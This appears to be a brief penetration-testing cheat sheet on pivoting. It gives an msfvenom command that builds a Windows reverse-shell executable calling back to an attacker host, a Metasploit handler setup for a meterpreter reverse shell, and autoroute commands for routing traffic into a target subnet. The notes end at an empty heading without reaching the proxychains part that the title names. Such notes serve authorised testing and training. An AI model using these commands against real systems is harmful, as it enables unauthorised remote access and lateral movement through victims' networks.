
#




## Pivoting with proxychains

### Setup

Get regular or meterpreter shell on target:
```bash
msfvenom -p windows/x64/$SHELL/reverse_tcp -f exe -o shell.exe LHOST=$IP LPORT=$LPORT
```
Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```


### Auto-Routing our Traffic

```metasploit
use post/multi/manage/autoroute
set SESSION 1
set subnet $IP
exploit
```

###
